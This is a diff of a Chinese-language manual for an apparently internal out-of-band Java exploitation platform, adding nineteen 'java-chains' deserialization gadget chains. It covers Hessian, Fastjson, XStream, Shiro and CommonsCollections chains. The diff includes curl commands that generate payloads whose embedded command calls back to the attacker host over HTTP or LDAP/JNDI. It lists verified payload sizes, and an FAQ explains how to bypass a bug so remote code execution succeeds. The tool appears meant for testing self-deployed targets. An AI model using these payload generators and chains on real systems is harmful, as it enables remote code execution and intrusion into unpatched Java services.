@@ -1,6 +1,6 @@
 # OOBserver-Next 使用手册
 
-> **版本** 1.0 · 2026-04-26  
+> **版本** 2.0 · 2026-04-28  
 > **定位** 内网 OOB (Out-of-Band) 漏洞利用平台 —— 攻击侧工具，非靶机  
 > **环境** CT1 = 10.0.7.25（OOBserver / 攻击机）
 
@@ -9,17 +9,28 @@
 ## 1. 系统架构
 
 ```
-┌─────────────────────────────────────────────────────┐
-│             CT1  10.0.7.25  (OOBserver)             │
-│                                                     │
-│   :8711  Bytecode Sidecar  ──┐                      │
-│   :8015  FastAPI 后端       ├── 生成 Payload          │
-│   :1389  LDAP Listener     ──┘                      │
-│   :1099  RMI  Listener                              │
-└─────────────────────────────────────────────────────┘
-           │  HTTP/LDAP/RMI OOB 回调
+┌─────────────────────────────────────────────────────────┐
+│             CT1  10.0.7.25  (OOBserver)                 │
+│                                                         │
+│   :8711  Bytecode Sidecar  ──┐                          │
+│           └── :8011 java-chains (内嵌，容器内)  ├── 生成 Payload (82 条)
+│   :8010  FastAPI 后端       ──┘                          │
+│   :1389  LDAP Listener                                  │
+│   :1099  RMI  Listener                                  │
+│   :9999  TCP  Collector                                 │
+│   :5353  DNS  Listener (可选)                            │
+└─────────────────────────────────────────────────────────┘
+           │  HTTP/LDAP/RMI/TCP/DNS OOB 回调
            ▼
     TargetHost (任意靶机)
+```
+
+**注：** 裸机（CT1）部署后端端口为 `8015`；Docker Compose 部署为 `8010`。下文示例统一使用 `$OOB_API` 变量。
+
+```bash
+export OOB=10.0.7.25
+export OOB_API=http://$OOB:8010   # Docker / 8015 for bare metal
+export OOB_SIDECAR=http://$OOB:8711
 ```
 
 OOBserver **不包含**漏洞靶机。靶机由用户自行部署。
@@ -477,6 +488,8 @@ curl -sf -H "Authorization: Bearer $JWT" \
 
 ### 7.2 Hessian 协议
 
+**marshalsec 内置链（`_tfactory` bug，反序列化触发正常但 RCE 失败）：**
+
 | Chain ID | 端点 | 状态 |
 |----------|------|------|
 | `hessian1_rome` | `/hessian` | PARTIAL（反序列化触发，RCE 待修复）|
@@ -485,6 +498,15 @@ curl -sf -H "Authorization: Bearer $JWT" \
 | `hessian2_spring` | `/hessian2` | PARTIAL |
 | `hessian1_cc6` | `/hessian` | PARTIAL |
 | `hessian2_cc6` | `/hessian2` | PARTIAL |
+
+**java-chains 增强链（推荐，无 `_tfactory` 问题）：**
+
+| Chain ID | 参数 | 状态 |
+|----------|------|------|
+| `jchains_hessian1_spring` | `jndi_url` | ✅ JNDI 触发 |
+| `jchains_hessian1_exec` | `cmd` | ✅ 直接命令执行 |
+| `jchains_hessian2_spring` | `jndi_url` | ✅ JNDI 触发 |
+| `jchains_hessian2_exec` | `cmd` | ✅ 直接命令执行 |
 
 ### 7.3 XStream
 
@@ -513,6 +535,57 @@ curl -sf -H "Authorization: Bearer $JWT" \
 |----------|------|------|
 | `c3p0_wrapperds` | 嵌套反序列化 | ✅ |
 | `c3p0_jndi` | JNDI 触发 | LDAP 触发 |
+
+### 7.7 java-chains 增强链（`jchains_*`，19 条）
+
+> java-chains 以 sidecar 内嵌方式运行，监听 `:8011`，无需单独部署。  
+> `jchains_*` 链相比内置链的优势：**直接命令执行**（无需 JNDI），且无 `_tfactory` NPE 问题。
+
+**用法与内置链完全相同，只需换 chain ID：**
+
+```bash
+# 直接命令执行（exec 类，无需 JNDI）
+curl -sf -X POST $OOB_SIDECAR/generate \
+  -H "Content-Type: application/json" \
+  -d '{"chain":"jchains_cc6","params":{"cmd":"curl http://'"$OOB"':8010/callback/http/'"$TOKEN"'"}}'
+
+# JNDI 触发（jndi 类）
+curl -sf -X POST $OOB_SIDECAR/generate \
+  -H "Content-Type: application/json" \
+  -d '{"chain":"jchains_hessian1_spring","params":{"jndi_url":"ldap://'"$OOB"':1389/'"$TOKEN"'"}}'
+```
+
+**完整链清单：**
+
+| Chain ID | 协议 | 参数 | 说明 |
+|---|---|---|---|
+| `jchains_hessian1_spring` | Hessian1 | `jndi_url` | Spring JNDI，1526 B |
+| `jchains_hessian1_exec` | Hessian1 | `cmd` | JDK native 直接执行 |
+| `jchains_hessian2_spring` | Hessian2 | `jndi_url` | Spring JNDI，1286 B |
+| `jchains_hessian2_exec` | Hessian2 | `cmd` | JDK native 直接执行 |
+| `jchains_fastjson` / `jchains_fastjson_jndi` | Fastjson | `jndi_url` | JdbcRowSetImpl (≤1.2.47) |
+| `jchains_fastjson_bcel` | Fastjson | `cmd` | BCEL 字节码注入 (≤1.2.24)，返回 JSON |
+| `jchains_xstream` / `jchains_xstream_jndi` | XStream | `jndi_url` | Spring JNDI |
+| `jchains_xstream_exec` | XStream | `cmd` | JDK native 直接执行 |
+| `jchains_shiro_cbc` | Shiro CBC | `cmd` | CB1+TemplatesImpl，返回 base64 cookie |
+| `jchains_cc1` | Java 反序列化 | `cmd` | CommonsCollections K1 |
+| `jchains_cc2` | Java 反序列化 | `cmd` | CommonsCollections K2 |
+| `jchains_cc3` | Java 反序列化 | `cmd` | CommonsCollections K3 |
+| `jchains_cc4` | Java 反序列化 | `cmd` | CommonsCollections K4 |
+| `jchains_cc6` / `jchains_native_cc6` | Java 反序列化 | `cmd` | CommonsCollections K1，1918 B |
+| `jchains_cb1` / `jchains_native_cb1` | Java 反序列化 | `cmd` | CommonsBeanutils1 |
+
+**已验证（Docker 容器测试）：**
+
+| Chain | 大小 | hex 前缀 | 状态 |
+|---|---|---|---|
+| `jchains_cc6` | 1918 B | `aced0005` | ✅ Java 序列化 |
+| `jchains_hessian1_spring` | 1526 B | `56740011` | ✅ Hessian1 |
+| `jchains_hessian2_spring` | 1286 B | `72116a61` | ✅ Hessian2 |
+| `jchains_fastjson` | 256 B | `7b0a2020` | ✅ JSON |
+| `jchains_xstream` | 2134 B | `3c736f72` | ✅ XML |
+| `jchains_fastjson_bcel` | 2141 B | `7b0a2020` | ✅ JSON |
+| `jchains_shiro_cbc` | 2112 B | `41414141` | ✅ base64 cookie |
 
 ---
 
@@ -565,7 +638,11 @@ A: sidecar 统一返回 `{"value":"<base64>","format":"..."}` 格式，JSON/XML 
 A: `bytecode_b64`（class 字节码，javaCodeBase 模式）或 `serialized_b64`（序列化对象，javaSerializedData 模式，绕过 trustURLCodebase）。
 
 **Q: Hessian 链返回 `EqualsBean@hash` 但无回调？**  
-A: 反序列化正常触发（EqualsBean@hash 证明），但 RCE 因 sidecar bug 失败：`TemplatesImpl._tfactory` 是 `transient` 字段，Hessian 不序列化它，反序列化后为 null，导致 `defineTransletClasses()` NPE。待修复。
+A: 内置 marshalsec Hessian 链（`hessian1_*` / `hessian2_*`）有已知 bug：`TemplatesImpl._tfactory` 是 `transient` 字段，Hessian 不序列化它，反序列化后 NPE。  
+**解决方案：改用 `jchains_hessian1_exec` 或 `jchains_hessian1_spring`**，这两条链绕过了 `_tfactory` 问题，已验证可用。
+
+**Q: java-chains 链提示 "empty payload" / "hint: Ensure java-chains is running"？**  
+A: java-chains 需约 30s 启动时间。确认 sidecar healthcheck 通过后（`docker compose ps` 显示 `(healthy)`）再试。Docker 容器内 java-chains 日志在 `/var/log/java-chains.log`。
 
 **Q: Log4shell 在 JDK ≥ 8u191 无法 RCE？**  
 A: JDK 8u191+ 默认 `trustURLCodebase=false`，阻止从远程 LDAP 加载 class。  
